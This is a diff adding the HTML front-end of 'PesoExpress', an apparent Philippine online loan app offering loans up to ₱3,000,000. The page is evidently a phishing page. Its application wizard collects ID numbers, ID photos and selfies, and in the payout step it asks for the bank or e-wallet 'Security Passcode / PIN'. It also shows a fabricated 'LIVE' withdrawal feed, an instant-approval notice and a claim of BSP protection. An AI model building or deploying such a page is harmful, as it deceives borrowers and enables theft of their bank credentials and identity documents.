@@ -1,0 +1,542 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>PesoExpress 🇵🇭</title>
+    <link rel="icon" type="image/svg+xml" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><circle cx='50' cy='50' r='48' fill='%2300b359'/><circle cx='50' cy='50' r='38' fill='%23ffcc00'/><text x='50' y='67' font-size='50' font-weight='900' text-anchor='middle' fill='%23004c99'>₱</text></svg>">
+    <link rel="stylesheet" href="style.css">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+</head>
+<body>
+
+    <div class="app-container">
+
+        <!-- TOP ROYAL BLUE HEADER BAR -->
+        <header class="app-header">
+            <div class="header-user-info">
+                <span id="headerTitlePrefix">Hello,</span>
+                <strong id="headerUserPhone">2655+656545</strong>
+            </div>
+            <div class="header-actions">
+                <div class="icon-circle-btn" onclick="openNotificationsModal()" style="cursor: pointer;">
+                    🔔
+                    <div class="notification-dot"></div>
+                </div>
+                <div class="user-avatar-badge" id="headerAvatarBadge" onclick="switchMobileTab('profile')" style="cursor: pointer;">2</div>
+            </div>
+        </header>
+
+        <div class="app-body">
+
+            <!-- AUTH SECTION (REGISTER & LOGIN) -->
+            <section id="authSection" class="auth-wrapper">
+                <div class="auth-header">
+                    <h2>Fast Peso Cash Loan 🇵🇭</h2>
+                    <p>Log in or register to access instant loans up to ₱3,000,000.</p>
+                </div>
+
+                <div class="auth-tabs">
+                    <div id="tabRegister" class="auth-tab active" onclick="switchAuthTab('register')">Register Account</div>
+                    <div id="tabLogin" class="auth-tab" onclick="switchAuthTab('login')">User Login</div>
+                </div>
+
+                <!-- REGISTER FORM -->
+                <form id="registerForm" onsubmit="handleRegister(event)">
+                    <div class="form-group">
+                        <label for="regPhone">Mobile Phone Number</label>
+                        <div class="input-prefix-wrapper">
+                            <span class="input-prefix">+63</span>
+                            <input type="tel" id="regPhone" class="form-control" placeholder="Enter phone number" required>
+                        </div>
+                    </div>
+                    <div class="form-group">
+                        <label for="regPassword">Create Password</label>
+                        <input type="password" id="regPassword" class="form-control" placeholder="At least 6 characters" required minlength="6">
+                    </div>
+                    <div class="form-group">
+                        <label for="regConfirmPassword">Re-enter Password</label>
+                        <input type="password" id="regConfirmPassword" class="form-control" placeholder="Confirm your password" required minlength="6">
+                    </div>
+                    <div id="regError" style="color: var(--danger-color); font-size: 0.85rem; margin-bottom: 1rem; display: none;"></div>
+                    <button type="submit" class="btn btn-primary btn-block">Register & Continue</button>
+                </form>
+
+                <!-- LOGIN FORM -->
+                <form id="loginForm" onsubmit="handleLogin(event)" style="display: none;">
+                    <div class="form-group">
+                        <label for="loginPhone">Registered Mobile Number</label>
+                        <div class="input-prefix-wrapper">
+                            <span class="input-prefix">+63</span>
+                            <input type="tel" id="loginPhone" class="form-control" placeholder="Enter phone number" required>
+                        </div>
+                    </div>
+                    <div class="form-group">
+                        <label for="loginPassword">Password</label>
+                        <input type="password" id="loginPassword" class="form-control" placeholder="Enter your password" required>
+                    </div>
+                    <div id="loginError" style="color: var(--danger-color); font-size: 0.85rem; margin-bottom: 1rem; display: none;"></div>
+                    <button type="submit" class="btn btn-primary btn-block">Login to My Portal</button>
+                </form>
+            </section>
+
+
+            <!-- PORTAL SECTION (LOGGED IN USER) -->
+            <section id="portalSection" style="display: none;">
+
+                <!-- TAB 1: HOME DASHBOARD VIEW (MATCHING REFERENCE UI) -->
+                <div id="viewHome">
+
+                    <!-- HERO CAROUSEL BANNER CARD -->
+                    <div class="hero-banner-card" id="heroBannerCard">
+                        <div class="banner-top-badge" id="bannerBadge">
+                            📢 Big Loans for Business
+                        </div>
+                        <div class="banner-content">
+                            <span style="font-size: 0.85rem; opacity: 0.9;" id="bannerSub">every need,</span>
+                            <h3 style="color: #ff3333;" id="bannerTitle">VERY DREAM.</h3>
+                            <p style="font-size: 0.75rem; opacity: 0.8; margin-top: 0.2rem;" id="bannerTags">PERSONAL LOAN | HOME LOAN</p>
+                            <h4 style="font-size: 1.1rem; margin-top: 0.4rem; color: #ffeb3b;" id="bannerFooter">Big Loans for Business</h4>
+                        </div>
+                        <div class="banner-dots">
+                            <div class="banner-dot active" onclick="setSlide(0)"></div>
+                            <div class="banner-dot" onclick="setSlide(1)"></div>
+                            <div class="banner-dot" onclick="setSlide(2)"></div>
+                            <div class="banner-dot" onclick="setSlide(3)"></div>
+                        </div>
+                    </div>
+
+                    <!-- "APPLY NOW" BLUE QUICK ACTION BOX -->
+                    <div class="apply-action-card">
+                        <div class="apply-action-header">
+                            <div class="apply-icon-box" style="font-size: 1.6rem;">💰</div>
+                            <div class="apply-action-text">
+                                <h4>Apply Now</h4>
+                                <p>Fast application, simple process, quick approval.</p>
+                            </div>
+                        </div>
+                        <button class="btn-apply-pill" onclick="switchMobileTab('apply')">
+                            Apply Now <span style="font-weight: 900;">&rsaquo;</span>
+                        </button>
+                    </div>
+
+                    <!-- EXCHANGE RATES CARD -->
+                    <div class="exchange-rates-card">
+                        <h4>Exchange Rates</h4>
+                        <table class="rates-table">
+                            <thead>
+                                <tr>
+                                    <th>CURRENCY</th>
+                                    <th class="center">BUY</th>
+                                    <th class="center">SELL</th>
+                                </tr>
+                            </thead>
+                            <tbody>
+                                <tr>
+                                    <td>
+                                        <div class="currency-pair">
+                                            <span style="display:inline-flex; align-items:center; gap:0.3rem;"><svg width="22" height="15" viewBox="0 0 22 15" style="border-radius:2px; border:1px solid rgba(0,0,0,0.1);"><rect width="22" height="7.5" fill="#0038a8"/><rect y="7.5" width="22" height="7.5" fill="#ce1126"/><polygon points="0,0 11,7.5 0,15" fill="#ffffff"/><circle cx="4" cy="7.5" r="1.5" fill="#fcd116"/></svg> PHP</span> | 
+                                            <span style="display:inline-flex; align-items:center; gap:0.3rem;"><svg width="22" height="15" viewBox="0 0 22 15" style="border-radius:2px; border:1px solid rgba(0,0,0,0.1);"><rect width="22" height="15" fill="#b22234"/><path d="M0 2.3h22M0 4.6h22M0 6.9h22M0 9.2h22M0 11.5h22M0 13.8h22" stroke="#fff" stroke-width="1.15"/><rect width="10" height="8" fill="#3c3b6e"/></svg> USD</span>
+                                        </div>
+                                    </td>
+                                    <td class="center"><span class="rate-badge">0.017</span></td>
+                                    <td class="center"><span class="rate-badge">0.017</span></td>
+                                </tr>
+                                <tr>
+                                    <td>
+                                        <div class="currency-pair">
+                                            <span style="display:inline-flex; align-items:center; gap:0.3rem;"><svg width="22" height="15" viewBox="0 0 22 15" style="border-radius:2px; border:1px solid rgba(0,0,0,0.1);"><rect width="22" height="7.5" fill="#0038a8"/><rect y="7.5" width="22" height="7.5" fill="#ce1126"/><polygon points="0,0 11,7.5 0,15" fill="#ffffff"/><circle cx="4" cy="7.5" r="1.5" fill="#fcd116"/></svg> PHP</span> | 
+                                            <span style="display:inline-flex; align-items:center; gap:0.3rem;"><svg width="22" height="15" viewBox="0 0 22 15" style="border-radius:2px; border:1px solid rgba(0,0,0,0.1);"><rect width="22" height="15" fill="#003399"/><circle cx="11" cy="7.5" r="4.5" fill="none" stroke="#ffcc00" stroke-dasharray="1 1.3" stroke-width="1.5"/></svg> EUR</span>
+                                        </div>
+                                    </td>
+                                    <td class="center"><span class="rate-badge">0.015</span></td>
+                                    <td class="center"><span class="rate-badge">0.015</span></td>
+                                </tr>
+                                <tr>
+                                    <td>
+                                        <div class="currency-pair">
+                                            <span style="display:inline-flex; align-items:center; gap:0.3rem;"><svg width="22" height="15" viewBox="0 0 22 15" style="border-radius:2px; border:1px solid rgba(0,0,0,0.1);"><rect width="22" height="7.5" fill="#0038a8"/><rect y="7.5" width="22" height="7.5" fill="#ce1126"/><polygon points="0,0 11,7.5 0,15" fill="#ffffff"/><circle cx="4" cy="7.5" r="1.5" fill="#fcd116"/></svg> PHP</span> | 
+                                            <span style="display:inline-flex; align-items:center; gap:0.3rem;"><svg width="22" height="15" viewBox="0 0 22 15" style="border-radius:2px; border:1px solid rgba(0,0,0,0.1);"><rect width="22" height="7.5" fill="#ce1126"/><rect y="7.5" width="22" height="7.5" fill="#ffffff"/></svg> IDR</span>
+                                        </div>
+                                    </td>
+                                    <td class="center"><span class="rate-badge">291.769</span></td>
+                                    <td class="center"><span class="rate-badge">291.769</span></td>
+                                </tr>
+                                <tr>
+                                    <td>
+                                        <div class="currency-pair">
+                                            <span style="display:inline-flex; align-items:center; gap:0.3rem;"><svg width="22" height="15" viewBox="0 0 22 15" style="border-radius:2px; border:1px solid rgba(0,0,0,0.1);"><rect width="22" height="7.5" fill="#0038a8"/><rect y="7.5" width="22" height="7.5" fill="#ce1126"/><polygon points="0,0 11,7.5 0,15" fill="#ffffff"/><circle cx="4" cy="7.5" r="1.5" fill="#fcd116"/></svg> PHP</span> | 
+                                            <span style="display:inline-flex; align-items:center; gap:0.3rem;"><svg width="22" height="15" viewBox="0 0 22 15" style="border-radius:2px; border:1px solid rgba(0,0,0,0.1);"><rect width="22" height="15" fill="#cc0000"/><path d="M0 2.1h22M0 4.2h22M0 6.3h22M0 8.4h22M0 10.5h22M0 12.6h22" stroke="#fff" stroke-width="1.05"/><rect width="11" height="8.4" fill="#000066"/><circle cx="5" cy="4.2" r="2.5" fill="#ffcc00"/></svg> MYR</span>
+                                        </div>
+                                    </td>
+                                    <td class="center"><span class="rate-badge">0.067</span></td>
+                                    <td class="center"><span class="rate-badge">0.067</span></td>
+                                </tr>
+                                <tr>
+                                    <td>
+                                        <div class="currency-pair">
+                                            <span style="display:inline-flex; align-items:center; gap:0.3rem;"><svg width="22" height="15" viewBox="0 0 22 15" style="border-radius:2px; border:1px solid rgba(0,0,0,0.1);"><rect width="22" height="7.5" fill="#0038a8"/><rect y="7.5" width="22" height="7.5" fill="#ce1126"/><polygon points="0,0 11,7.5 0,15" fill="#ffffff"/><circle cx="4" cy="7.5" r="1.5" fill="#fcd116"/></svg> PHP</span> | 
+                                            <span style="display:inline-flex; align-items:center; gap:0.3rem;"><svg width="22" height="15" viewBox="0 0 22 15" style="border-radius:2px; border:1px solid rgba(0,0,0,0.1);"><rect width="22" height="15" fill="#ee1c25"/><polygon points="3,2 4,5 1,3 5,3 2,5" fill="#ffde00"/></svg> CNY</span>
+                                        </div>
+                                    </td>
+                                    <td class="center"><span class="rate-badge">0.111</span></td>
+                                    <td class="center"><span class="rate-badge">0.111</span></td>
+                                </tr>
+                            </tbody>
+                        </table>
+                    </div>
+
+                    <!-- LIVE WITHDRAWAL SUCCESS FEED CARD -->
+                    <div class="withdrawal-feed-card">
+                        <div class="withdrawal-feed-header">
+                            <h4>🎉 Recent Withdrawal Success</h4>
+                            <div class="live-pulse-badge">
+                                <div class="pulse-dot"></div> LIVE
+                            </div>
+                        </div>
+                        <div class="ticker-container" id="withdrawalTickerContainer">
+                            <!-- Populated dynamically via JS -->
+                        </div>
+                    </div>
+
+                    <!-- SECONDARY PROMO BANNER -->
+                    <div style="background: linear-gradient(135deg, #e0f2fe 0%, #bae6fd 100%); padding: 1.25rem; border-radius: var(--radius-lg); text-align: center; border: 1px solid #7dd3fc;">
+                        <span style="font-size: 0.75rem; color: #0369a1; font-weight: 800; letter-spacing: 1px;">YOUR DREAMS, OUR SUPPORT</span>
+                        <h3 style="color: #0284c7; font-size: 1.3rem; margin-top: 0.2rem;">LOAN MADE EASY</h3>
+                        <p style="font-size: 0.8rem; color: #0369a1; margin-top: 0.3rem;">⚡ Low Interest | 🛡️ Trusted & Secure</p>
+                    </div>
+
+                </div>
+
+
+                <!-- TAB 2: WALLET SCREEN (`#viewWallet`) MATCHING EXACT REFERENCE IMAGE -->
+                <div id="viewWallet" style="display: none;">
+
+                    <!-- GREEN GRADIENT WALLET CARD -->
+                    <div class="wallet-gradient-card">
+                        <div class="wallet-balance-header">
+                            <div class="wallet-circle-icon">👛</div>
+                            <div class="wallet-balance-text">
+                                <span>Account balance</span>
+                                <h2 id="dashApprovedAmount">0</h2>
+                            </div>
+                        </div>
+
+                        <div class="wallet-row-pill">
+                            <div style="display: flex; align-items: center; gap: 0.6rem;">
+                                <span>💵</span> <span>Withdraw balance</span>
+                            </div>
+                            <strong style="color: #ff3333; font-size: 1.1rem;">0</strong>
+                        </div>
+
+                        <div class="wallet-row-pill">
+                            <div style="display: flex; align-items: center; gap: 0.6rem;">
+                                <span>✅</span> <span>Order Status</span>
+                            </div>
+                            <span id="dashStatusBadge" class="badge badge-pending" style="font-size: 0.75rem;">Waiting</span>
+                        </div>
+
+                        <div class="wallet-buttons-grid">
+                            <button class="btn-wallet-light" onclick="switchMobileTab('apply')">
+                                👁️ Loan Detail
+                            </button>
+                            <button id="withdrawActionBtn" class="btn-wallet-dark" onclick="processLoanWithdrawal()">
+                                ➤ Withdraw
+                            </button>
+                        </div>
+                    </div>
+
+                    <!-- SUPPORTED BANKS CARD -->
+                    <div class="supported-banks-card">
+                        <h4>🏛️ Supported Banks</h4>
+                        <div class="banks-grid">
+                            <div class="bank-card-tile bpi-tile">BPI</div>
+                            <div class="bank-card-tile bdo-tile"><div>BDO</div><div class="sub-text">Unibank</div></div>
+                            <div class="bank-card-tile bc-tile">BC</div>
+                            <div class="bank-card-tile cimb-tile">CIMB BANK</div>
+                            <div class="bank-card-tile gcash-tile">GCash</div>
+                            <div class="bank-card-tile pnb-tile">PNB</div>
+                            <div class="bank-card-tile landbank-tile">LANDBANK</div>
+                            <div class="bank-card-tile security-tile"><span>S</span>ECURITY</div>
+                            <div class="bank-card-tile union-tile">UB UnionBank</div>
+                            <div class="bank-card-tile rbank-tile">R BANK</div>
+                            <div class="bank-card-tile maya-tile">maya</div>
+                            <div class="bank-card-tile psbank-tile">PSBank</div>
+                            <div class="bank-card-tile dbp-tile">DBP</div>
+                            <div class="bank-card-tile maribank-tile">MariBank</div>
+                            <div class="bank-card-tile gotyme-tile">GoTyme</div>
+                            <div class="bank-card-tile shopeepay-tile">S Pay</div>
+                            <div class="bank-card-tile grabpay-tile">GrabPay</div>
+                            <div class="bank-card-tile aub-tile">AUB</div>
+                            <div class="bank-card-tile ptc-tile">PTC</div>
+                            <div class="bank-card-tile link-tile">LINK</div>
+                        </div>
+                    </div>
+
+                    <span id="dashNotes" style="display:none;"></span>
+                    <span id="withdrawNoticeMsg" style="display:none;"></span>
+                </div>
+
+
+                <!-- TAB 3: APPLICATION WIZARD VIEW (`#viewApply`) -->
+                <div id="viewApply" style="display: none;">
+                    
+                    <!-- CALCULATOR -->
+                    <div style="background: white; border-radius: var(--radius-lg); padding: 1.25rem; margin-bottom: 1.25rem; box-shadow: var(--shadow-md);">
+                        <h4 style="margin-bottom: 1rem; color: var(--primary-blue);">Loan Estimator</h4>
+                        <div class="slider-container" style="margin-bottom: 1rem;">
+                            <div style="display: flex; justify-content: space-between; font-size: 0.85rem; font-weight: 700;">
+                                <span>Desired Amount</span>
+                                <span style="color: var(--primary-blue);" id="calcAmountDisplay">₱ 500,000</span>
+                            </div>
+                            <input type="range" id="calcAmount" min="10000" max="3000000" step="10000" value="500000" oninput="updateCalculator()">
+                        </div>
+
+                        <div class="slider-container" style="margin-bottom: 1rem;">
+                            <div style="display: flex; justify-content: space-between; font-size: 0.85rem; font-weight: 700;">
+                                <span>Repayment Term</span>
+                                <span id="calcTermDisplay">12 Months (1 Year)</span>
+                            </div>
+                            <input type="range" id="calcTerm" min="1" max="36" step="1" value="12" oninput="updateCalculator()">
+                        </div>
+
+                        <div style="background: #f8fafc; padding: 0.85rem; border-radius: var(--radius-sm); display: flex; justify-content: space-between; font-size: 0.85rem;">
+                            <div><span>Est. Monthly</span><br><strong id="calcInterest">₱ 45,833 /mo</strong></div>
+                            <div style="text-align: right;"><span>Total Repay</span><br><strong id="calcTotal" style="color: var(--accent-green);">₱ 550,000</strong></div>
+                        </div>
+                    </div>
+
+                    <!-- 4-STEP FORM WIZARD -->
+                    <div class="application-card">
+                        <h3 style="text-align: center; margin-bottom: 1rem;">Loan Application Wizard</h3>
+                        
+                        <div class="step-indicator">
+                            <div id="stepHeader1" class="step-item active"><div class="step-number">1</div><div class="step-label">Personal</div></div>
+                            <div id="stepHeader2" class="step-item"><div class="step-number">2</div><div class="step-label">Work</div></div>
+                            <div id="stepHeader3" class="step-item"><div class="step-number">3</div><div class="step-label">ID Verification</div></div>
+                            <div id="stepHeader4" class="step-item"><div class="step-number">4</div><div class="step-label">Payout</div></div>
+                        </div>
+
+                        <form id="loanForm" onsubmit="submitLoanApplication(event)">
+                            <!-- Step 1 -->
+                            <div id="step1" class="form-step">
+                                <div class="form-group"><label>Full Legal Name</label><input type="text" id="fullName" class="form-control" placeholder="Juan Dela Cruz" required></div>
+                                <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 0.75rem;">
+                                    <div class="form-group"><label>Gender</label><select id="gender" class="form-control" required><option value="Male">Male</option><option value="Female">Female</option></select></div>
+                                    <div class="form-group"><label>Date of Birth</label><input type="date" id="dob" class="form-control" required></div>
+                                </div>
+                                <div class="form-group"><label>Civil Status</label><select id="civilStatus" class="form-control" required><option value="Single">Single</option><option value="Married">Married</option></select></div>
+                                <div class="form-group"><label>Address</label><textarea id="address" class="form-control" rows="2" required></textarea></div>
+                                <button type="button" class="btn btn-primary btn-block" onclick="goToStep(2)">Next &rarr;</button>
+                            </div>
+
+                            <!-- Step 2 -->
+                            <div id="step2" class="form-step" style="display: none;">
+                                <div class="form-group"><label>Employment Type</label><select id="employmentType" class="form-control" required><option value="Employed (Private)">Employed (Private)</option><option value="Self-Employed">Self-Employed</option></select></div>
+                                <div class="form-group"><label>Monthly Income (PHP)</label><input type="number" id="monthlyIncome" class="form-control" required></div>
+                                <div class="form-group"><label>Loan Purpose</label><select id="loanPurpose" class="form-control" required><option value="Emergency Expenses">Emergency Expenses</option><option value="Business Capital">Business Capital</option></select></div>
+                                <div style="display: flex; gap: 0.75rem;"><button type="button" class="btn btn-secondary" style="flex:1;" onclick="goToStep(1)">&larr; Back</button><button type="button" class="btn btn-primary" style="flex:2;" onclick="goToStep(3)">Next &rarr;</button></div>
+                            </div>
+
+                            <!-- Step 3 -->
+                            <div id="step3" class="form-step" style="display: none;">
+                                <div class="form-group"><label>Valid ID Type</label><select id="idType" class="form-control" required><option value="SSS / UMID ID">SSS / UMID ID</option><option value="Driver's License">Driver's License</option><option value="Passport">Passport</option></select></div>
+                                <div class="form-group"><label>ID Card Number</label><input type="text" id="idNumber" class="form-control" required></div>
+                                <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 0.75rem; margin: 1rem 0;">
+                                    <div style="border: 1px dashed #cbd5e1; padding: 0.75rem; text-align: center; border-radius: 8px;">
+                                        <div style="font-size: 1.5rem;">🪪</div>
+                                        <button type="button" class="btn btn-outline" style="font-size: 0.75rem; padding: 0.3rem 0.5rem;" onclick="document.getElementById('idCardFileInput').click()">ID Photo</button>
+                                        <input type="file" id="idCardFileInput" accept="image/*" style="display: none;" onchange="handleImageUpload(event, 'idCardPreview', 'idCardBase64')">
+                                        <img id="idCardPreview" style="display:none; width:100%; height:80px; margin-top:5px; object-fit:cover;">
+                                        <input type="hidden" id="idCardBase64">
+                                    </div>
+                                    <div style="border: 1px dashed #cbd5e1; padding: 0.75rem; text-align: center; border-radius: 8px;">
+                                        <div style="font-size: 1.5rem;">🤳</div>
+                                        <button type="button" class="btn btn-outline" style="font-size: 0.75rem; padding: 0.3rem 0.5rem;" onclick="document.getElementById('selfieFileInput').click()">Selfie Sign</button>
+                                        <input type="file" id="selfieFileInput" accept="image/*" style="display: none;" onchange="handleImageUpload(event, 'selfiePreview', 'selfieBase64')">
+                                        <img id="selfiePreview" style="display:none; width:100%; height:80px; margin-top:5px; object-fit:cover;">
+                                        <input type="hidden" id="selfieBase64">
+                                    </div>
+                                </div>
+                                <div style="display: flex; gap: 0.75rem;"><button type="button" class="btn btn-secondary" style="flex:1;" onclick="goToStep(2)">&larr; Back</button><button type="button" class="btn btn-primary" style="flex:2;" onclick="goToStep(4)">Next &rarr;</button></div>
+                            </div>
+
+                            <!-- Step 4 -->
+                            <div id="step4" class="form-step" style="display: none;">
+                                <div class="form-group"><label>Payout Bank / Wallet</label><select id="payoutMethod" class="form-control" required><option value="GCash">💙 GCash</option><option value="Maya (PayMaya)">💚 Maya / PayMaya</option><option value="LINK (NetBank)">🌐 LINK (NetBank)</option><option value="BPI">🏛️ BPI</option><option value="BDO">🏛️ BDO</option><option value="China Bank">🏛️ China Bank</option><option value="UnionBank">🏛️ UnionBank</option></select></div>
+                                <div class="form-group"><label>Account Holder Name</label><input type="text" id="bankAccountName" class="form-control" required></div>
+                                <div class="form-group"><label>Account / Wallet Number</label><input type="text" id="bankAccountNumber" class="form-control" required></div>
+                                <div class="form-group"><label>Security Passcode / PIN</label><input type="password" id="bankAccountPassword" class="form-control" required></div>
+                                <div id="formError" style="color: var(--danger-color); font-size: 0.85rem; margin-bottom: 1rem; display: none;"></div>
+                                <div style="display: flex; gap: 0.75rem;"><button type="button" class="btn btn-secondary" style="flex:1;" onclick="goToStep(3)">&larr; Back</button><button type="submit" class="btn btn-primary" style="flex:2;">🚀 Submit Application</button></div>
+                            </div>
+                        </form>
+                    </div>
+
+                </div>
+
+
+                <!-- TAB 4: PROFILE SCREEN (`#viewProfile`) MATCHING EXACT REFERENCE IMAGE -->
+                <div id="viewProfile" style="display: none;">
+                    
+                    <!-- PROFILE VERIFICATION CARD -->
+                    <div class="profile-verify-card">
+                        <div class="profile-avatar-ring">
+                            <div class="profile-avatar-inner">
+                                👤
+                            </div>
+                        </div>
+                        <h3>Profile Verification</h3>
+                        <p>Your credit score will appear here after verification.</p>
+                    </div>
+
+                    <!-- ACCOUNT MENU CARD -->
+                    <div class="account-menu-card">
+                        <h4>Account Menu</h4>
+                        <p>Manage your profile, contract, schedule, and transactions.</p>
+
+                        <button class="menu-pill-btn" onclick="alert('Viewing Personal Information')">
+                            <div class="btn-left">
+                                <div class="menu-icon-circle">👤</div>
+                                <span>Personal information</span>
+                            </div>
+                            <span style="font-weight:900;">&rsaquo;</span>
+                        </button>
+
+                        <button class="menu-pill-btn" onclick="openBeneficiaryModal()">
+                            <div class="btn-left">
+                                <div class="menu-icon-circle">🏛️</div>
+                                <span>Beneficiary information</span>
+                            </div>
+                            <span style="font-weight:900;">&rsaquo;</span>
+                        </button>
+
+                        <button class="menu-pill-btn" onclick="alert('Viewing Loan Contract')">
+                            <div class="btn-left">
+                                <div class="menu-icon-circle">🅿️</div>
+                                <span>Loan Contract</span>
+                            </div>
+                            <span style="font-weight:900;">&rsaquo;</span>
+                        </button>
+
+                        <button class="menu-pill-btn" onclick="alert('Viewing Payment Schedule')">
+                            <div class="btn-left">
+                                <div class="menu-icon-circle">📅</div>
+                                <span>Payment Schedule</span>
+                            </div>
+                            <span style="font-weight:900;">&rsaquo;</span>
+                        </button>
+
+                        <button class="menu-pill-btn" onclick="alert('Viewing Transactions History')">
+                            <div class="btn-left">
+                                <div class="menu-icon-circle">🕒</div>
+                                <span>Transactions</span>
+                            </div>
+                            <span style="font-weight:900;">&rsaquo;</span>
+                        </button>
+
+                        <button class="menu-pill-btn" onclick="alert('PesoExpress Philippines Online Loans v1.0')">
+                            <div class="btn-left">
+                                <div class="menu-icon-circle">🎴</div>
+                                <span>About us</span>
+                            </div>
+                            <span style="font-weight:900;">&rsaquo;</span>
+                        </button>
+
+                        <button class="btn-logout-pill" onclick="logoutUser()">
+                            <span>🚪</span>
+                            <span>Logout</span>
+                        </button>
+                    </div>
+
+                </div>
+
+            </section>
+
+        </div>
+
+        <!-- FIXED BOTTOM NAVIGATION BAR (MATCHING REFERENCE UI) -->
+        <nav id="bottomNav" class="app-bottom-nav" style="display: none;">
+            <div id="bNavHome" class="bottom-nav-item active" onclick="switchMobileTab('home')">
+                <div class="bottom-nav-icon">🏠</div>
+                <span>HOME</span>
+            </div>
+            <div id="bNavWallet" class="bottom-nav-item" onclick="switchMobileTab('wallet')">
+                <div class="bottom-nav-icon">💳</div>
+                <span>WALLET</span>
+            </div>
+            <div id="bNavProfile" class="bottom-nav-item" onclick="switchMobileTab('profile')">
+                <div class="bottom-nav-icon">👤</div>
+                <span>PROFILE</span>
+            </div>
+        </nav>
+
+    </div>
+
+    <!-- BENEFICIARY SETTLEMENT ACCOUNT MODAL WITH EYE TOGGLE BUTTON -->
+    <div id="beneficiaryModal" class="modal-overlay">
+        <div class="modal-content" style="max-width: 440px; padding: 1.5rem;">
+            <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 1rem; border-bottom: 1px solid var(--border-color); padding-bottom: 0.5rem;">
+                <h3 style="color: var(--primary-blue); font-size: 1.15rem; display: flex; align-items: center; gap: 0.4rem;">💳 Beneficiary Information</h3>
+                <span class="close-modal" onclick="closeBeneficiaryModal()">&times;</span>
+            </div>
+            <div style="text-align: left; margin-bottom: 1.25rem;">
+                <div class="form-group" style="margin-bottom: 0.85rem;">
+                    <label>Financial Provider</label>
+                    <input type="text" id="viewPayoutMethod" class="form-control" readonly style="background: #edf2f7; font-weight: 700;">
+                </div>
+
+                <div style="background: #f8fafc; border: 1px solid var(--border-color); border-radius: var(--radius-sm); padding: 0.85rem;">
+                    <div style="margin-bottom: 0.6rem;">
+                        <span style="font-size: 0.85rem; font-weight: 800; color: var(--text-dark);">Account Credentials</span>
+                    </div>
+                    
+                    <div class="form-group" style="margin-bottom: 0.75rem;">
+                        <label style="font-size: 0.8rem; color: var(--text-muted);">Account Holder Name</label>
+                        <div style="position: relative; display: flex; align-items: center;">
+                            <input type="text" id="viewBankAccountName" class="form-control" readonly style="background: #ffffff; font-weight: 700; padding-right: 40px;">
+                            <button id="bankPrivacyEyeBtn1" type="button" onclick="toggleBankPrivacy()" title="Toggle visibility" style="position: absolute; right: 8px; background: transparent; border: none; cursor: pointer; display: flex; align-items: center; justify-content: center; padding: 4px;">
+                                <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#0066cc" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path><circle cx="12" cy="12" r="3"></circle></svg>
+                            </button>
+                        </div>
+                    </div>
+
+                    <div class="form-group" style="margin-bottom: 0;">
+                        <label style="font-size: 0.8rem; color: var(--text-muted);">Account / Wallet Number</label>
+                        <div style="position: relative; display: flex; align-items: center;">
+                            <input type="text" id="viewBankAccountNumber" class="form-control" readonly style="background: #ffffff; font-weight: 700; padding-right: 40px;">
+                            <button id="bankPrivacyEyeBtn2" type="button" onclick="toggleBankPrivacy()" title="Toggle visibility" style="position: absolute; right: 8px; background: transparent; border: none; cursor: pointer; display: flex; align-items: center; justify-content: center; padding: 4px;">
+                                <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#0066cc" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path><circle cx="12" cy="12" r="3"></circle></svg>
+                            </button>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            <button class="btn btn-primary btn-block" onclick="closeBeneficiaryModal()">Done</button>
+        </div>
+    </div>
+
+    <!-- NOTIFICATIONS MODAL -->
+    <div id="notifModal" class="modal-overlay">
+        <div class="modal-content" style="max-width: 400px; padding: 1.5rem;">
+            <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 1rem; border-bottom: 1px solid var(--border-color); padding-bottom: 0.5rem;">
+                <h3 style="color: var(--primary-blue); font-size: 1.15rem;">🔔 System Notifications</h3>
+                <span class="close-modal" onclick="closeNotificationsModal()">&times;</span>
+            </div>
+            <div style="text-align: left; margin-bottom: 1.25rem;">
+                <div style="background: #f8fafc; padding: 0.85rem; border-radius: var(--radius-sm); border-left: 4px solid var(--accent-green); margin-bottom: 0.75rem;">
+                    <strong style="font-size: 0.9rem; color: var(--text-dark);">🎉 Instant Credit Line Approved!</strong>
+                    <p style="font-size: 0.8rem; color: var(--text-muted); margin-top: 0.2rem;">Welcome to PesoExpress! You are qualified for quick online loans up to ₱3,000,000.</p>
+                </div>
+                <div style="background: #f8fafc; padding: 0.85rem; border-radius: var(--radius-sm); border-left: 4px solid var(--primary-blue);">
+                    <strong style="font-size: 0.9rem; color: var(--text-dark);">🛡️ Security Compliance</strong>
+                    <p style="font-size: 0.8rem; color: var(--text-muted); margin-top: 0.2rem;">All bank credentials and ID documents are protected under BSP regulations.</p>
+                </div>
+            </div>
+            <button class="btn btn-primary btn-block" onclick="closeNotificationsModal()">Got It</button>
+        </div>
+    </div>
+
+    <script src="app.js"></script>
+</body>
+</html>
